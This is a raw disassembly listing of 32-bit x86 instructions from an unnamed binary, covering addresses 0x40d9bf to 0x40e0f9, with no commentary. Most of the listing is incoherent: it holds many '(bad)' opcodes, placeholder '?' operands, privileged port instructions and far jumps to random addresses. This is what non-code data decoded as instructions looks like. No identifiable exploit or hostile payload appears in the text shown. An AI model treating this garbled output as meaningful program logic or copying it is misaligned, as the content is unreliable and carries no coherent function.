  40d9bf:	call   0xff65d84f
  40d9c4:	mov    eax,DWORD PTR [eax+ebx*8+0xc]
  40d9c8:	add    BYTE PTR [ebx+ecx*4+0xc],al
  40d9cc:	adc    al,0x5e
  40d9ce:	add    al,0xe5
  40d9d0:	add    dl,al
  40d9d2:	add    BYTE PTR [eax],al
  40d9d4:	inc    DWORD PTR [ecx]
  40d9d6:	push   eax
  40d9d7:	cli    
  40d9d8:	add    al,bh
  40d9da:	shl    DWORD PTR [ecx],1
  40d9dc:	inc    esp
  40d9dd:	jmp    0x40d9eb
  40d9df:	xor    DWORD PTR [ebp+esi*2+0x14],eax
  40d9e3:	test   esi,eax
  40d9e5:	cli    
  40d9e6:	(bad)  
  40d9e7:	inc    DWORD PTR [eax+ecx*1+0x24]
  40d9eb:	inc    DWORD PTR [esp+0x1c]
  40d9ef:	and    al,0x74
  40d9f1:	mov    ebx,DWORD PTR [eax]
  40d9f3:	or     al,0x44
  40d9f5:	and    al,0x28
  40d9f7:	and    al,0x8d
  40d9f9:	add    esp,DWORD PTR [esp+esi*2]
  40d9fc:	push   eax
  40d9fd:	and    al,0x74
  40d9ff:	and    al,0x2c
  40da01:	add    esi,DWORD PTR [esp+eax*2+0x24]
  40da05:	ss mov bl,0x7
  40da08:	inc    DWORD PTR [ecx-0x7749775]
  40da0e:	xor    edi,DWORD PTR [esi+0x3b]
  40da11:	mov    ecx,DWORD PTR [ebx+0xf338b5d]
  40da17:	and    al,0x85
  40da19:	pushf  
  40da1a:	pushf  
  40da1b:	clc    
  40da1c:	dec    DWORD PTR [ecx+0x41073f5f]
  40da22:	add    BYTE PTR [ebx+0x7],al
  40da25:	inc    ecx
  40da26:	add    BYTE PTR [edi+0x7],al
  40da29:	inc    ecx
  40da2a:	add    BYTE PTR [ebx+0x7],cl
  40da2d:	inc    ecx
  40da2e:	add    BYTE PTR [edi+0x7],cl
  40da31:	inc    ecx
  40da32:	add    BYTE PTR [ebx+0x7],dl
  40da35:	inc    ecx
  40da36:	add    BYTE PTR [edi+0x7],dl
  40da39:	inc    ecx
  40da3a:	add    BYTE PTR [ebx+0x7],bl
  40da3d:	inc    ecx
  40da3e:	add    ah,dl
  40da40:	(bad)  
  40da41:	in     eax,dx
  40da42:	jp     0x40da33
  40da44:	jp     0x40da1d
  40da46:	(bad)  
  40da47:	jnp    0x40da85
  40da49:	adc    ecx,DWORD PTR [esi+0xf]
  40da4c:	loopne 0x40d9d0
  40da4e:	das    
  40da4f:	pop    ebx
  40da50:	loope  0x40da52
  40da52:	add    BYTE PTR [eax],ah
  40da54:	pop    es
  40da55:	add    BYTE PTR [eax],al
  40da57:	mov    eax,ds:0xa03acb40
  40da5c:	jg     0x40da17
  40da5e:	mov    ebx,0x3726f55
  40da63:	mov    esp,0x23bbcded
  40da68:	pusha  
  40da69:	adc    DWORD PTR [ebp-0x51beab47],esp
  40da6f:	add    cl,BYTE PTR [edx]
  40da71:	adc    esi,ebp
  40da73:	push   edx
  40da74:	mov    al,ds:0xb27b1dbe
  40da79:	adc    BYTE PTR [ebx+0x65300663],0x48
  40da80:	push   0x1574a053
  40da85:	dec    esi
  40da86:	scas   eax,DWORD PTR es:[edi]
  40da87:	fucompp 
  40da89:	xchg   BYTE PTR [esi-0x1f7d995f],bl
  40da8f:	dec    esi
  40da90:	inc    ebp
  40da91:	inc    ecx
  40da92:	cmp    ah,BYTE PTR [eax]
  40da94:	add    al,BYTE PTR [edi]
  40da96:	inc    edi
  40da97:	push   esi
  40da98:	mov    DWORD PTR [ecx+0x1814c2ff],edx
  40da9e:	fadd   DWORD PTR [edi-0x14]
  40daa1:	ret    0xa28c
  40daa4:	outs   dx,DWORD PTR ds:[esi]
  40daa5:	jge    0x40da62
  40daa7:	push   es
  40daa8:	push   0x5c
  40daaa:	or     dl,cl
  40daac:	int    0x6b
  40daae:	retf   0x9cfa
  40dab1:	imul   ecx,DWORD PTR [ebp+0x74552094],0x9805d246
  40dabb:	(bad)  es:[edi]
  40dabe:	pop    edx
  40dabf:	test   ebx,esi
  40dac1:	xor    cl,BYTE PTR [ebx+0x42bd5f4c]
  40dac7:	(bad)  
  40dac8:	in     eax,0x6e
  40daca:	retf   0xf292
  40dacd:	xchg   DWORD PTR [esi],ebp
  40dacf:	pop    esp
  40dad0:	jns    0x40da6c
  40dad2:	mov    ebx,esp
  40dad4:	shr    ebx,cl
  40dad6:	bound  ebp,QWORD PTR [eax-0x26eeefd6]
  40dadc:	test   BYTE PTR [edi-0x19],0x29
  40dae0:	xor    cl,BYTE PTR [ebx-0x66]
  40dae3:	bound  ebx,QWORD PTR [ebx-0x77]
  40dae6:	mov    esi,0x93b5ee68
  40daeb:	call   0x6fdb:0x6eb046a7
  40daf2:	pop    edi
  40daf3:	push   edi
  40daf4:	repz push esi
  40daf6:	mov    esi,0xc8867443
  40dafb:	push   esp
  40dafc:	mov    BYTE PTR [ebx-0x7e],dh
  40daff:	xchg   esi,eax
  40db00:	xchg   edi,eax
  40db01:	inc    eax
  40db02:	mov    ds:0x8e193cf3,eax
  40db07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db08:	add    DWORD PTR [edx+0x60],ecx
  40db0b:	push   edx
  40db0c:	inc    ebp
  40db0d:	push   esi
  40db0e:	xor    DWORD PTR [ebp+0x214812ba],ecx
  40db14:	lds    ecx,FWORD PTR [ebx+0x76738f3]
  40db1a:	cwde   
  40db1b:	cmp    eax,0x87569c29
  40db20:	repnz cmp edi,DWORD PTR [edi]
  40db23:	fstp   DWORD PTR fs:[eax-0x62a38ad7]
  40db2a:	sbb    ebx,ecx
  40db2c:	cdq    
  40db2d:	xchg   esi,eax
  40db2e:	into   
  40db2f:	cmp    al,0x43
  40db31:	adc    al,0xda
  40db33:	sahf   
  40db34:	add    bh,BYTE PTR [ebx-0x14c04959]
  40db3a:	in     al,dx
  40db3b:	sub    bl,bl
  40db3d:	cmp    ch,dh
  40db3f:	xchg   ecx,eax
  40db40:	cmpxchg8b QWORD PTR [eax+0x4f1b1a90]
  40db47:	sub    edi,DWORD PTR [esi-0x3a]
  40db4a:	jp     0x40db67
  40db4c:	mov    ah,0xed
  40db4e:	stos   BYTE PTR es:[edi],al
  40db4f:	jo     0x40daed
  40db51:	test   BYTE PTR [ebp-0x7e],0xad
  40db55:	repnz mov ebp,0x94735ff3
  40db5b:	scas   eax,DWORD PTR es:[edi]
  40db5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db5d:	or     esi,DWORD PTR [edi]
  40db5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db60:	leave  
  40db61:	jmp    0x40db46
  40db63:	(bad)  
  40db64:	cmp    ebp,DWORD PTR [ebx+eax*1+0x22]
  40db68:	dec    ebx
  40db69:	std    
  40db6a:	fmul   st(7),st
  40db6c:	add    ah,BYTE PTR [eax]
  40db6e:	mov    eax,?
  40db70:	imul   ebx,DWORD PTR [ecx+eax*8-0x74],0xe5c485d9
  40db78:	(bad)  
  40db79:	shl    BYTE PTR [ebp+0x2b479d22],cl
  40db7f:	push   esp
  40db80:	fwait
  40db81:	retf   0xff2b
  40db84:	jb     0x40db99
  40db86:	and    DWORD PTR [edi-0x5c],eax
  40db89:	jg     0x40dbbf
  40db8b:	aaa    
  40db8c:	pusha  
  40db8d:	fwait
  40db8e:	imul   edx,ebp,0x7f
  40db91:	loope  0x40dbb9
  40db93:	clc    
  40db94:	mov    ch,0xf6
  40db96:	jmp    0x9a1:0x6f78a108
  40db9d:	mov    ebx,0x62313373
  40dba2:	mov    dh,bl
  40dba4:	(bad)  
  40dba5:	ficom  DWORD PTR [edi-0x2a]
  40dba8:	dec    eax
  40dba9:	mov    ebx,0x6ed8adea
  40dbae:	in     eax,0x4b
  40dbb0:	dec    ebx
  40dbb1:	sar    DWORD PTR [ecx-0x5d],0xe7
  40dbb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbb6:	inc    ebx
  40dbb7:	iret   
  40dbb8:	ror    BYTE PTR [ecx],0x7
  40dbbb:	ja     0x40dc23
  40dbbd:	loop   0x40dbe7
  40dbbf:	iret   
  40dbc0:	jmp    0xf32538a6
  40dbc5:	in     eax,dx
  40dbc6:	pop    es
  40dbc7:	sbb    ch,BYTE PTR [edi+eax*8+0xf]
  40dbcb:	pop    ebp
  40dbcc:	inc    ebp
  40dbcd:	xchg   edi,eax
  40dbce:	rcl    dh,0x76
  40dbd1:	(bad)  
  40dbd2:	gs dec ecx
  40dbd4:	inc    ebx
  40dbd5:	enter  0xa6c4,0x68
  40dbd9:	and    BYTE PTR [eax-0x6d],dl
  40dbdc:	xlat   BYTE PTR ds:[ebx]
  40dbdd:	and    al,BYTE PTR [eax+0x17]
  40dbe0:	imul   esi,DWORD PTR [ebx-0x39],0xffffff82
  40dbe4:	push   cs
  40dbe5:	cmp    dl,BYTE PTR [ecx-0x11]
  40dbe8:	jle    0x40dbe4
  40dbea:	or     DWORD PTR [eax-0x30],esp
  40dbed:	out    0x9c,eax
  40dbef:	scas   eax,DWORD PTR es:[edi]
  40dbf0:	fldenv [edi]
  40dbf2:	cwde   
  40dbf3:	push   ebx
  40dbf4:	clc    
  40dbf5:	mov    ?,WORD PTR [ecx]
  40dbf7:	push   es
  40dbf8:	mov    eax,0x7d7cc66f
  40dbfd:	jmp    0xa5d5cc65
  40dc02:	jnp    0x40dc7a
  40dc04:	push   esp
  40dc05:	sbb    al,0x9e
  40dc07:	arpl   di,di
  40dc09:	fld    st(7)
  40dc0b:	dec    esp
  40dc0c:	rcl    BYTE PTR [ebx-0x5],cl
  40dc0f:	push   ecx
  40dc10:	sbb    DWORD PTR [esi],eax
  40dc12:	fild   QWORD PTR [ecx-0x23]
  40dc15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc17:	mov    ch,0xdb
  40dc19:	cmp    DWORD PTR [ebx-0x3f],ebp
  40dc1c:	sti    
  40dc1d:	clc    
  40dc1e:	xor    eax,DWORD PTR [ebx+0x6953631e]
  40dc24:	clc    
  40dc25:	jmp    0x86fae55c
  40dc2a:	mov    ecx,ss
  40dc2c:	fnstsw WORD PTR [edx+ecx*2-0x3325e14b]
  40dc33:	jmp    0x40dc05
  40dc35:	jmp    0x95e6:0x2c2635ff
  40dc3c:	div    DWORD PTR [ebx+0x4d95ca28]
  40dc42:	pop    esi
  40dc43:	mov    al,0x48
  40dc45:	push   ss
  40dc46:	or     al,0x40
  40dc48:	add    eax,0xea18ca72
  40dc4d:	mov    esp,0xc32614e3
  40dc52:	xor    eax,0xa50ac6b0
  40dc57:	cmp    cl,BYTE PTR [edi]
  40dc59:	imul   ebp,DWORD PTR [edi],0x58
  40dc5c:	cli    
  40dc5d:	xlat   BYTE PTR ds:[ebx]
  40dc5e:	cmp    al,0x1f
  40dc60:	cmp    esi,ebx
  40dc62:	jecxz  0x40dcbb
  40dc64:	ins    BYTE PTR es:[edi],dx
  40dc65:	pop    ss
  40dc66:	push   ebp
  40dc67:	or     ah,BYTE PTR [ecx-0x5b]
  40dc6a:	out    dx,al
  40dc6b:	and    eax,0x46f03f5d
  40dc70:	cwde   
  40dc71:	test   eax,0x5965e60c
  40dc76:	pop    esp
  40dc77:	xchg   ebx,eax
  40dc78:	dec    edx
  40dc79:	hlt    
  40dc7a:	dec    ebp
  40dc7b:	and    al,BYTE PTR [edx]
  40dc7d:	sub    al,0xb5
  40dc7f:	jno    0x40dcd0
  40dc81:	aad    0x94
  40dc83:	cmp    eax,0x3179b701
  40dc88:	jmp    0x10592a45
  40dc8d:	test   bh,bl
  40dc8f:	and    ch,al
  40dc91:	sub    DWORD PTR [ebx],edi
  40dc93:	jb     0x40dc64
  40dc95:	pop    esi
  40dc96:	jl     0x40dd0d
  40dc98:	mov    BYTE PTR [ecx],bh
  40dc9a:	(bad)  
  40dc9b:	push   edi
  40dc9c:	cwde   
  40dc9d:	cmp    ah,BYTE PTR [esi]
  40dc9f:	cmp    al,0x2c
  40dca1:	mov    bh,0xc5
  40dca3:	add    eax,0x472236d5
  40dca8:	icebp  
  40dca9:	cli    
  40dcaa:	(bad)
  40dcad:	cdq    
  40dcae:	ficom  DWORD PTR [edi]
  40dcb0:	dec    edi
  40dcb1:	loope  0x40dcd9
  40dcb3:	les    eax,FWORD PTR [esi-0x383c93eb]
  40dcb9:	repz jle 0x40dd1c
  40dcbc:	push   edx
  40dcbd:	mov    cl,0x70
  40dcbf:	sub    edx,DWORD PTR [ebx]
  40dcc1:	push   cs
  40dcc2:	divps  xmm5,XMMWORD PTR [edx-0x4e575b24]
  40dcc9:	jbe    0x40dd1b
  40dccb:	xchg   edx,eax
  40dccc:	sbb    eax,0x7d005b1c
  40dcd1:	mov    bh,0xbd
  40dcd3:	pop    edx
  40dcd4:	push   edx
  40dcd5:	cmc    
  40dcd6:	push   ebp
  40dcd7:	das    
  40dcd8:	addr16 push ds
  40dcda:	inc    edi
  40dcdb:	pop    eax
  40dcdc:	addr16 xor esp,esi
  40dcdf:	lahf   
  40dce0:	mov    DWORD PTR [ecx-0x49a22267],esp
  40dce6:	sbb    eax,0xe64cbd12
  40dceb:	call   0x9ae8303b
  40dcf0:	fucomip st,st(1)
  40dcf2:	scas   al,BYTE PTR es:[edi]
  40dcf3:	mov    ebp,0xd960a4cf
  40dcf8:	pop    esp
  40dcf9:	neg    DWORD PTR [eax]
  40dcfb:	loop   0x40dd66
  40dcfd:	mov    BYTE PTR [ecx+0x31],bl
  40dd00:	fistp  QWORD PTR cs:[esi-0x15d13d68]
  40dd07:	fnstenv [edi-0xb]
  40dd0a:	les    esi,FWORD PTR [eax]
  40dd0c:	xchg   ebx,eax
  40dd0d:	pop    esi
  40dd0e:	enter  0xa804,0xe6
  40dd12:	mov    esp,0x99be3e4b
  40dd17:	fbld   TBYTE PTR ds:0x45b3e7e1
  40dd1d:	ss pop ecx
  40dd1f:	popf   
  40dd20:	dec    eax
  40dd21:	push   0x70ed0b80
  40dd26:	loopne 0x40dd6f
  40dd28:	push   0xffffff96
  40dd2a:	ins    DWORD PTR es:[edi],dx
  40dd2b:	jmp    0x40dd18
  40dd2d:	or     ebx,DWORD PTR [edi]
  40dd2f:	push   eax
  40dd30:	cdq    
  40dd31:	sub    DWORD PTR [ecx-0x35],edi
  40dd34:	mov    edx,0x926a9084
  40dd39:	inc    ebp
  40dd3a:	call   0x9992:0x93661e83
  40dd41:	loopne 0x40dd17
  40dd43:	and    edx,DWORD PTR [ebx]
  40dd45:	jmp    0x75d6:0x8cc3ab7
  40dd4c:	mov    ecx,0x52929d0e
  40dd51:	add    eax,0x9efeb38a
  40dd56:	in     eax,0x61
  40dd58:	add    eax,0x9f57f761
  40dd5d:	cli    
  40dd5e:	adc    eax,0xa3be87cd
  40dd63:	push   eax
  40dd64:	clc    
  40dd65:	push   edx
  40dd66:	push   esp
  40dd67:	add    BYTE PTR ds:0x84c92c66,ch
  40dd6d:	xchg   edx,ebp
  40dd6f:	call   0x106:0x1fb077ed
  40dd76:	dec    eax
  40dd77:	pop    ds
  40dd78:	in     eax,0xbf
  40dd7a:	push   esi
  40dd7b:	hlt    
  40dd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd7d:	push   eax
  40dd7e:	clc    
  40dd7f:	in     eax,dx
  40dd80:	xor    al,BYTE PTR [edx+0x50f20631]
  40dd86:	nop
  40dd87:	mov    ds:0xb725c74c,al
  40dd8c:	adc    DWORD PTR [ebx-0x51],eax
  40dd8f:	jbe    0x40ddfb
  40dd91:	in     al,0xe2
  40dd93:	mov    ecx,0xdd9364a3
  40dd98:	push   cs
  40dd99:	aam    0x8a
  40dd9b:	mov    bh,dh
  40dd9d:	push   edx
  40dd9e:	mov    bl,BYTE PTR [ecx+eiz*8+0x40]
  40dda2:	adc    cl,BYTE PTR [esi+0x4f836b36]
  40dda8:	shl    BYTE PTR [ecx],cl
  40ddaa:	pop    esp
  40ddab:	jns    0x40dd4b
  40ddad:	or     bh,al
  40ddaf:	into   
  40ddb0:	push   0xffffff8b
  40ddb2:	or     bl,BYTE PTR [ebp-0x6d]
  40ddb5:	rcr    eax,1
  40ddb7:	fisub  WORD PTR [edi]
  40ddb9:	adc    eax,0xf407650
  40ddbe:	shl    DWORD PTR [ebx],1
  40ddc0:	stos   DWORD PTR es:[edi],eax
  40ddc1:	repnz inc esi
  40ddc3:	or     ah,BYTE PTR [ebp-0x2e]
  40ddc6:	imul   edx,DWORD PTR [edx-0x3bdf58cf],0xa51c1f56
  40ddd0:	mov    ah,0x32
  40ddd2:	cmp    bl,BYTE PTR [ecx+eiz*4+0x76]
  40ddd6:	or     DWORD PTR [ebp-0x545df2cc],ebp
  40dddc:	test   al,0x63
  40ddde:	stc    
  40dddf:	pop    es
  40dde0:	mov    dh,0xc6
  40dde2:	jnp    0x40ddb1
  40dde4:	(bad)  
  40dde5:	loope  0x40dd6a
  40dde7:	mov    edi,0x91947abb
  40ddec:	in     eax,dx
  40dded:	push   eax
  40ddee:	and    eax,0xbfe53af
  40ddf3:	jle    0x40dd82
  40ddf5:	lods   eax,DWORD PTR ds:[esi]
  40ddf6:	scas   al,BYTE PTR es:[edi]
  40ddf7:	arpl   WORD PTR ds:0xc4d63dd1,cx
  40ddfd:	push   esp
  40ddfe:	out    dx,eax
  40ddff:	enter  0xeb63,0x82
  40de03:	ins    DWORD PTR es:[edi],dx
  40de04:	cs fwait
  40de06:	in     al,0xc7
  40de08:	(bad)  [esi+edi*4+0x3d907eb2]
  40de0f:	lods   al,BYTE PTR ds:[esi]
  40de10:	jmp    0x931f7fe9
  40de15:	mov    bl,dl
  40de17:	pop    ebx
  40de18:	jge    0x40ddd1
  40de1a:	ror    DWORD PTR [edi-0x69],1
  40de1d:	arpl   WORD PTR [ebx],di
  40de1f:	mov    bl,0x59
  40de21:	xor    al,0xfc
  40de23:	cmp    DWORD PTR [esi-0xc9a85f1],edi
  40de29:	dec    edx
  40de2a:	pop    edx
  40de2b:	nop
  40de2c:	fwait
  40de2d:	mov    ds:0xb7b1003d,eax
  40de32:	sub    al,0xfb
  40de34:	mov    al,0x8e
  40de36:	(bad)  
  40de37:	cli    
  40de38:	pop    edx
  40de39:	xchg   esi,eax
  40de3a:	jg     0x40de92
  40de3c:	fmul   QWORD PTR [ecx]
  40de3e:	test   al,0x62
  40de40:	cmp    ah,BYTE PTR [ebp-0x1b]
  40de43:	stos   BYTE PTR es:[edi],al
  40de44:	rol    ebp,0xae
  40de47:	bound  eax,QWORD PTR [eax+0x8b88a6d]
  40de4d:	fnsave [esi-0x15f88aa6]
  40de53:	mov    edx,0xf5478ae
  40de58:	sbb    ebx,0xffffff9b
  40de5b:	jmp    0x40de55
  40de5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de5e:	shl    DWORD PTR [edx+0x60],1
  40de61:	pop    ax
  40de63:	cld    
  40de64:	das    
  40de65:	sbb    al,0x6a
  40de67:	xchg   BYTE PTR [ebx-0x43],dl
  40de6a:	sbb    bh,BYTE PTR [edx-0x6b98f8e4]
  40de70:	jmp    0xe36c:0x693aa57e
  40de77:	mov    ah,0x85
  40de79:	push   esp
  40de7a:	adc    ecx,ebx
  40de7c:	push   esp
  40de7d:	push   edi
  40de7e:	js     0x40de09
  40de80:	adc    DWORD PTR [eax+ebx*1],edi
  40de83:	(bad)  
  40de84:	dec    esp
  40de85:	pop    ebx
  40de86:	dec    ebp
  40de87:	ins    DWORD PTR es:[edi],dx
  40de88:	fcomip st,st(6)
  40de8a:	pop    edi
  40de8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de8c:	(bad)  [eax]
  40de8e:	dec    eax
  40de8f:	aaa    
  40de90:	scas   eax,DWORD PTR es:[edi]
  40de91:	jne    0x40de6a
  40de93:	sbb    DWORD PTR [eax+0x40],0xffffff88
  40de97:	cmp    eax,0x18c670c7
  40de9c:	push   esp
  40de9d:	jb     0x40de9e
  40de9f:	add    BYTE PTR ds:0xf2d4af84,bl
  40dea5:	inc    ecx
  40dea6:	sahf   
  40dea7:	imul   esi,eax,0xffffffda
  40deaa:	ret    
  40deab:	cmp    eax,0x1caf4d61
  40deb0:	cmp    dl,BYTE PTR [esi+ebx*1+0x5c]
  40deb4:	cmp    BYTE PTR [ecx+0x1701de4a],0x9
  40debb:	clc    
  40debc:	out    0xb4,eax
  40debe:	and    eax,0x49ab3d64
  40dec3:	dec    ebp
  40dec4:	into   
  40dec5:	pop    esi
  40dec6:	test   BYTE PTR [eax+0x5e],ch
  40dec9:	daa    
  40deca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40decb:	jmp    0x1b57:0xe9a01fc1
  40ded2:	mov    BYTE PTR [ebp-0x34],dl
  40ded5:	rol    DWORD PTR [edx+0x6d],1
  40ded8:	and    eax,0x5b83716e
  40dedd:	sbb    ch,ch
  40dedf:	push   esi
  40dee0:	mov    eax,eax
  40dee2:	mov    ah,0x1b
  40dee4:	popf   
  40dee5:	jmp    0x680ecadb
  40deea:	sub    BYTE PTR [eax-0x4c],dl
  40deed:	or     DWORD PTR [ebp-0x22882ebb],esp
  40def3:	pop    ds
  40def4:	aaa    
  40def5:	pusha  
  40def6:	call   0x40d51d07
  40defb:	mov    esp,?
  40defd:	jle    0x40df7d
  40deff:	jb     0x40df50
  40df01:	les    edx,FWORD PTR [ebx+edx*8-0x2ac7c183]
  40df08:	cmp    DWORD PTR [edi-0x6adf37a8],ebx
  40df0e:	lock ja 0x40df66
  40df11:	in     eax,dx
  40df12:	pop    edx
  40df13:	ss inc ebp
  40df15:	out    dx,al
  40df16:	jmp    0x6342a77f
  40df1b:	pop    esi
  40df1c:	sub    al,0xb2
  40df1e:	pop    eax
  40df1f:	lods   al,BYTE PTR ds:[esi]
  40df20:	xchg   esi,eax
  40df21:	inc    ebp
  40df22:	xor    BYTE PTR [ecx],0xce
  40df25:	call   0xd48eab45
  40df2a:	fbstp  TBYTE PTR [edi-0x13]
  40df2d:	shr    BYTE PTR [edx],0x6f
  40df30:	adc    eax,0xb973199c
  40df35:	test   al,0xb5
  40df37:	aaa    
  40df38:	cmp    bh,bh
  40df3a:	inc    eax
  40df3b:	scas   eax,DWORD PTR es:[edi]
  40df3c:	imul   ebx,DWORD PTR gs:[ecx],0xffffffdc
  40df40:	xor    dl,dh
  40df42:	rol    esp,0x4e
  40df45:	pop    ds
  40df46:	stos   BYTE PTR es:[edi],al
  40df47:	xchg   BYTE PTR [ebp+esi*4+0x60d13519],al
  40df4e:	adc    edx,DWORD PTR [ebp-0x4d]
  40df51:	cmc    
  40df52:	jnp    0x40dfa5
  40df54:	sub    al,0x32
  40df56:	jp     0x40df94
  40df58:	xor    eax,0x16390980
  40df5d:	jl     0x40dfcc
  40df5f:	mov    ah,0x9e
  40df61:	inc    esp
  40df62:	out    dx,al
  40df63:	inc    esp
  40df64:	into   
  40df65:	in     eax,dx
  40df66:	sahf   
  40df67:	pop    ebx
  40df68:	cli    
  40df69:	mov    edx,0x76e81c3b
  40df6e:	pop    ebx
  40df6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df70:	xchg   DWORD PTR [esi+0x77],eax
  40df73:	xchg   ebx,eax
  40df74:	add    esi,ebx
  40df76:	aad    0x93
  40df78:	retf   
  40df79:	and    al,0xf5
  40df7b:	pop    ss
  40df7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df7d:	mov    ah,0x93
  40df7f:	mov    ah,0x83
  40df81:	test   BYTE PTR [edx-0x6e],ah
  40df84:	(bad)  
  40df85:	idiv   DWORD PTR [ebp-0x4b]
  40df88:	xchg   ebx,eax
  40df89:	arpl   WORD PTR [ecx-0x20],ax
  40df8c:	dec    esp
  40df8d:	cwde   
  40df8e:	in     eax,0xe2
  40df90:	loop   0x40dff9
  40df92:	cli    
  40df93:	iret   
  40df94:	cld    
  40df95:	ins    DWORD PTR es:[edi],dx
  40df96:	call   0x5484:0x47a68cf2
  40df9d:	das    
  40df9e:	mov    BYTE PTR [eax],bh
  40dfa0:	inc    eax
  40dfa1:	xchg   edi,eax
  40dfa2:	scas   eax,DWORD PTR es:[edi]
  40dfa3:	cli    
  40dfa4:	mov    edx,0xc1d3d99f
  40dfa9:	iret   
  40dfaa:	hlt    
  40dfab:	mov    ebp,0x1bf8dc4a
  40dfb0:	data16 jns 0x40dfda
  40dfb3:	mov    ecx,0x935a011c
  40dfb8:	repnz mov ebx,0x2786292a
  40dfbe:	rol    BYTE PTR [ebx+esi*8+0x46],1
  40dfc2:	hlt    
  40dfc3:	lods   eax,DWORD PTR ds:[esi]
  40dfc4:	pop    ecx
  40dfc5:	loopne 0x40e02e
  40dfc7:	push   ss
  40dfc8:	sub    ch,BYTE PTR ds:0x89f187d4
  40dfce:	mov    esp,0x5c845ce8
  40dfd3:	sub    DWORD PTR [ebx],esi
  40dfd5:	scas   eax,DWORD PTR es:[edi]
  40dfd6:	push   cx
  40dfd8:	cmc    
  40dfd9:	push   ss
  40dfda:	ret    0x816
  40dfdd:	sub    DWORD PTR [eax-0x1a],esi
  40dfe0:	or     cl,BYTE PTR [edx+eax*1]
  40dfe3:	mov    DWORD PTR [eax-0x2d],eax
  40dfe6:	jae    0x40e058
  40dfe8:	push   DWORD PTR [ecx+0x3c]
  40dfeb:	mov    edx,DWORD PTR [ebx]
  40dfed:	mov    ds:0xc02d22ad,eax
  40dff2:	xlat   BYTE PTR ds:[ebx]
  40dff3:	inc    ebp
  40dff4:	in     al,0x38
  40dff6:	(bad)
  40dff9:	inc    eax
  40dffa:	adc    ebp,DWORD PTR [edx]
  40dffc:	mov    cl,0x8d
  40dffe:	mov    ah,0xbe
  40e000:	ss scas al,BYTE PTR es:[edi]
  40e002:	mov    eax,ds:0x2f811d23
  40e007:	mov    ebp,0xf8b5c63d
  40e00c:	push   ebp
  40e00d:	pop    ebp
  40e00e:	fnstcw WORD PTR [esi+0x4]
  40e011:	data16 add al,BYTE PTR [esi]
  40e014:	mov    dh,0x1
  40e016:	add    al,0x4e
  40e018:	xchg   ecx,eax
  40e019:	mov    ah,BYTE PTR [esi-0x2b]
  40e01c:	jg     0x40e041
  40e01e:	push   ds
  40e01f:	dec    edx
  40e020:	mov    cl,0xba
  40e022:	test   esi,esp
  40e024:	rcl    DWORD PTR [edx-0x1542f76b],cl
  40e02a:	ror    BYTE PTR [edi-0x41],0x79
  40e02e:	dec    eax
  40e02f:	data16 add BYTE PTR [ecx+0x2d51fa95],ch
  40e036:	pusha  
  40e037:	imul   dh
  40e039:	mov    ch,0xc7
  40e03b:	sub    ah,ch
  40e03d:	xchg   ebx,eax
  40e03e:	ret    
  40e03f:	retf   
  40e040:	jp     0x40e05c
  40e042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e043:	jnp    0x40e0c0
  40e045:	aas    
  40e046:	xchg   esp,eax
  40e047:	jge    0x40e05c
  40e049:	pop    esp
  40e04a:	xchg   edi,eax
  40e04b:	imul   ebp,DWORD PTR [edx+0x6],0xffffffd3
  40e04f:	mov    al,ds:0xf7b94e5f
  40e054:	or     eax,0xd6a1fccd
  40e059:	mov    edi,0x2c905a6b
  40e05e:	fadd   DWORD PTR [edx-0x55]
  40e061:	aad    0xef
  40e063:	sbb    esp,0x7576de9a
  40e069:	icebp  
  40e06a:	outs   dx,DWORD PTR ds:[esi]
  40e06b:	pop    esi
  40e06c:	and    eax,0xed9c9d5e
  40e071:	shl    BYTE PTR [ecx],0xf9
  40e074:	or     eax,0x1de6558a
  40e079:	xchg   esp,eax
  40e07a:	xchg   ecx,eax
  40e07b:	sub    DWORD PTR [eax-0x24],0x67b53217
  40e082:	jo     0x40e0ba
  40e084:	push   es
  40e085:	jne    0x40e03f
  40e087:	in     al,dx
  40e088:	pop    edi
  40e089:	jo     0x40e0db
  40e08b:	push   ebx
  40e08c:	gs inc esp
  40e08e:	pusha  
  40e08f:	fdiv   QWORD PTR [edx]
  40e091:	pop    ecx
  40e092:	aaa    
  40e093:	lods   eax,DWORD PTR ds:[esi]
  40e094:	pushf  
  40e095:	dec    ecx
  40e096:	xor    BYTE PTR [edi-0x1cff6d00],ah
  40e09c:	gs inc edi
  40e09e:	mov    dl,0xea
  40e0a0:	mov    ds:0x49386719,eax
  40e0a5:	mov    dh,0x35
  40e0a7:	inc    eax
  40e0a8:	addr16 xchg ebp,eax
  40e0aa:	mov    al,ds:0xf5ca09b5
  40e0af:	jecxz  0x40e053
  40e0b1:	test   DWORD PTR [esi+0x1f5145c0],edx
  40e0b7:	cmp    al,0x6
  40e0b9:	imul   edx,edx,0xffffff9e
  40e0bc:	retf   
  40e0bd:	cmp    eax,0xc61e03a6
  40e0c2:	sub    edi,DWORD PTR [ebx]
  40e0c4:	rcl    BYTE PTR [edi+0x34efa37d],cl
  40e0ca:	ja     0x40e057
  40e0cc:	jb     0x40e134
  40e0ce:	xchg   ecx,eax
  40e0cf:	aad    0xc4
  40e0d1:	xchg   edx,eax
  40e0d2:	adc    al,0x76
  40e0d4:	mov    ch,0x85
  40e0d6:	mov    esi,0x4793a874
  40e0db:	ins    DWORD PTR es:[edi],dx
  40e0dc:	into   
  40e0dd:	aam    0x9f
  40e0df:	out    0xd4,eax
  40e0e1:	or     al,0xfc
  40e0e3:	and    al,0x55
  40e0e5:	pop    esi
  40e0e6:	fcmovb st,st(0)
  40e0e8:	imul   ebx,DWORD PTR [ebx],0x32
  40e0eb:	stos   DWORD PTR es:[edi],eax
  40e0ec:	call   0x3cca3619
  40e0f1:	leave  
  40e0f2:	imul   DWORD PTR [ebx+0x4572639a]
  40e0f8:	int3   
  40e0f9:	leave  
